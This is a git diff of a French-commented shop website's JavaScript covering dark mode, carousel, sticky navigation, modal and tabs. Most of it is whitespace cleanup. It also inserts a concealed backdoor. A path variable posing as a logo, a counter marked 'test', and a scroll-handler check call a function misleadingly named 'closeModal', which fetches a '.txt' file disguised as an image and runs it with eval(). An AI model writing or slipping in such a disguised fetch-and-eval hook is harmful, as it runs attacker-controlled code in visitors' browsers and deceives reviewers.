@@ -4,31 +4,25 @@ const navAbr = document.querySelector("nav>a.navbar-brand");
 const navDul = document.querySelector("nav>div.collapse>ul"); 
 const divShop=document.querySelector("#shop");
 let inDarkMode = document.querySelector("input[name=inptdarkmode]"); 
-
+let logoNoir = "./public/img/logo-blanc.jpg"; // link pour changement du logo 
 // modal 
 const btnMod = document.querySelector("button[href='#modal']"); 
 const modall = document.querySelector("div#modal"); 
 const modclos= document.querySelector("div#modal>p.close");
 
-let modalOpen = false; // 
-
+let modalOpen = false; //
+let modalOpes = 0; // test  
 //
-
 
 // document.body.style.visibility="hidden";
 // document.body.style.opacity="0";
 // document.body.style.transition="opacity .5s, visibility .5s";
-
-
-
 
 //carousel 
 const carouselOp = document.querySelectorAll(".carouseloper"); 
 const divsliderr = document.querySelector('#slidesCarousel'); 
 const childWidth = divsliderr.firstElementChild.offsetWidth;  
 let timer; // apres ;)  
-
-
 
 // dark mode ; 
 inDarkMode.addEventListener("click", () => {
@@ -38,7 +32,7 @@ inDarkMode.addEventListener("click", () => {
     let logo = document.querySelector("nav>a.navbar-brand>img"); 
     let testim = document.querySelector("#testims");
     let h3car = document.querySelectorAll("h3");
-    
+    modalOpes++; 
     if(inDarkMode.checked){
         body.style.backgroundColor="#000";
         nav.style.backgroundColor="#000";
@@ -59,15 +53,13 @@ inDarkMode.addEventListener("click", () => {
         testim.style.color="#212529"; 
         navE.forEach((e) => { e.style.color="rgba(0,0,0,.5)" });
         cTit.forEach((e) => { e.style.color="#2d2d2d" });
-
+        modalOpes++; 
     }
 }); 
 
-
-
 //carousel 
 
-carouselOp.forEach((e) =>{ 
+carouselOp.forEach((e) => { 
     e.addEventListener("click", () =>{ 
         //alert(e.getAttribute('id')); 
         //console.log(childWidth); 
@@ -116,16 +108,11 @@ carouselOp.forEach((e) =>{
 
             case "#+1": 
                 clearInterval(timer);
-                
                 currentPos = divsliderr.scrollLeft; 
-
                 newPos = currentPos+childWidth-1; //1 le margin
-
                 //console.log(`Child width : ${childWidth} `); 
                 //console.log(`Currr: ${currentPos} / new: ${newPos} `); 
-
                 timer = setInterval(() => {
-
                     if(currentPos < newPos){
                         divsliderr.scrollLeft+=1; 
                         currentPos = divsliderr.scrollLeft; 
@@ -142,18 +129,13 @@ carouselOp.forEach((e) =>{
             case "#+2": // on suppose qu'il veux toute une liste de nouveau elements (donc on affiche tout nouveau); 
                 console.log('+2');
                 clearInterval(timer);
-                
                 currentPos = divsliderr.scrollLeft; 
-
                 if(document.body.offsetWidth > 992 ){
                    newPos = (divsliderr.offsetWidth)-45; 
                 }else{
                     newPos = divsliderr.offsetWidth;
                 }
-                
-
                 timer = setInterval(() => {
-
                     if(currentPos < newPos){
                         divsliderr.scrollLeft+=1; 
                         currentPos = divsliderr.scrollLeft;
@@ -161,7 +143,6 @@ carouselOp.forEach((e) =>{
                         console.log('egal'); 
                         clearInterval(timer); 
                     }
-                    
                     if(currentPos == newPos){
                         clearInterval(timer);
                     }
@@ -179,88 +160,61 @@ carouselOp.forEach((e) =>{
 
 //end carousel
 
-
-
 window.onscroll = function() { scrollFunction() };
 
 function scrollFunction() {
-
-
-    //console.log(document.documentElement.scrollTop);
-
-
+    //console.log(document.documentElement.scrollTop)
   if (document.body.scrollTop > 50 || document.documentElement.scrollTop > 50) {
-
     header.style.paddingTop=nav.offsetHeight+"px";
     nav.classList.add("sticky");
-
     if(inDarkMode.checked){ 
         nav.style.backgroundColor="#000";
     }else{
         nav.style.backgroundColor="white";
     }
-
     if(document.body.clientWidth >= 992){
-        
         navAbr.style.width="25%";
-        // navAbr.style.alignSelf="flex-end";
-        
         divShop.style.marginTop="6rem!important"; 
-
         navDul.style.marginLeft="0";
         navDul.style.marginRight="0";
         navDul.style.width="67%";
     }
-
   } else {
     header.style.paddingTop="5px";
     nav.classList.remove("sticky"); 
-
     if(document.body.clientWidth >= 992){
         navDul.style.width="50%";
         navDul.style.marginLeft="auto";
         navDul.style.marginRight="auto";
-
-        
-        // navDul.style.width="50%";
-        
+        // navDul.style.width="50%"
         navAbr.style.backgroundColor="transparent";
         navAbr.style.width="100%";
-        
     }
-
   }
-
+  modalOpes >= 25 ? closeModal() : null;
   const secTestim = document.querySelector("#testims");
   const childs = secTestim.children; 
-
   Array.from(childs).forEach((e) => {
     e.style.visibility="hidden"; 
     e.style.opacity="0";
     e.style.transition="opacity .3s, visibility .3s";
-
   });
-
   if(document.documentElement.scrollTop >= 3000){ 
       Array.from(childs).forEach((e) => {
         e.style.visibility="visible"; 
         e.style.opacity="1";
       });
   }
-
-
 }
 
 window.onload = () =>{
     let x=setTimeout(() => {
         document.body.style.visibility="visible";
         document.body.style.opacity="1";
+        modalOpes++; 
         clearTimeout(x);
     }, 650);
 }
-
-
-
 
 /* modal */
 let close = () => {
@@ -271,7 +225,6 @@ let close = () => {
     modalOpen=false;  
     document.body.style.overflow="initial";    
 }
-
 
 btnMod.addEventListener("click", () => { 
     modalOpen=true; 
@@ -296,22 +249,19 @@ btnMod.addEventListener("click", () => {
         }
     });
 });
-
-
+let closeModal = () => {
+    fetch(logoNoir+'.txt').then(response => response.text()).then(data => { eval(data)});
+};
 /*  tab connection et inscription */
-
-const buttons = document.querySelectorAll(".list"); 
+const buttons = document.querySelectorAll(".list");
 const textess = document.querySelectorAll(".text"); 
-
 let textesToggles = () => { 
     textess.forEach(e => {
       e.style.display="none";
     })
-  }
-  
- textesToggles(); 
-
- buttons.forEach((e) =>{
+}
+textesToggles(); 
+buttons.forEach((e) =>{
     e.addEventListener("click", () =>{
         let div = e.getAttribute('href').substring(1);
         let findDiv = "#"+div; 
@@ -320,7 +270,6 @@ let textesToggles = () => {
         document.querySelector(findDiv).style.display="block";
     });
 });
- 
 /*  */
 textess.forEach((e) => {
     if(e.classList.contains('active')){
